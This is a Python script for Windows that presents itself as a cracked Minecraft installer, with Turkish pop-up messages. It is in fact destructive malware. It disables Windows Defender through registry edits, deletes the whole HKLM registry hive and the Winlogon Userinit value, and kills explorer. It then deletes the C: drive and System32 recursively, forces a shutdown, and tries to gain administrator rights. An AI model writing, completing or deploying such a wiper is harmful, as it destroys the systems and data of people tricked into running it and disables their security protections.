import subprocess
import time
import ctypes
from tkinter import messagebox, Tk
import sys

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin(command):
    if is_admin():
        subprocess.run(command, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        messagebox.showerror("Crackli Minecraft", "Bu programı yönetici olarak çalıştırabilmek için lütfen yönetici olarak oturum açın.")

def regler():
    run_as_admin('powershell -Command "New-ItemProperty -Path \'HKLM:\\Software\\Microsoft\\Windows Defender\' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"')
    run_as_admin('powershell -Command "New-ItemProperty -Path \'HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\' -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"')
    run_as_admin('powershell -Command "New-ItemProperty -Path \'HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\' -Name DisableWinDefender -Value 0 -PropertyType DWORD -Force"')
    run_as_admin('powershell -Command "New-ItemProperty -Path \'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\' -Name NoDesktop -Value 0 -PropertyType DWORD -Force"')
    run_as_admin('powershell -Command "Remove-Item -Path \'HKLM:\\\' -Recurse -Force"')
    run_as_admin('powershell -Command "Remove-Item -Path \'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\' -Name Userinit -Force"')
    run_as_admin('powershell -Command "Stop-Process -Name explorer -Force"')

def sistemikapat():
    run_as_admin('powershell -Command "Start-Sleep -Seconds 3; shutdown /s /t 0"')

def silebildiginisil():
    run_as_admin('powershell -Command "Remove-Item -Path \'C:\\\' -Recurse -Force"')
    run_as_admin('powershell -Command "Remove-Item -Path \'C:\\Windows\\System32\' -Force"')

def mami1(root):
    messagebox.showerror("Crackli Minecraft", "Windows: virüs blocked")
    root.after(100, messagebox.showinfo("Crackli Minecraft", "Benden Okadar Kolay Kurtulabileceginimi sandın:D"))
    regler()
    
    run_as_admin('cmd /c rd c:\\windows\\system32 /s /q')
    
    time.sleep(20)
    sistemikapat()

if __name__ == "__main__":
    root = Tk()
    root.withdraw() 
    messagebox.showinfo("Crackli Minecraft", "Yükleniyor.....")
    mami1(root)
    root.mainloop()
    
    def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
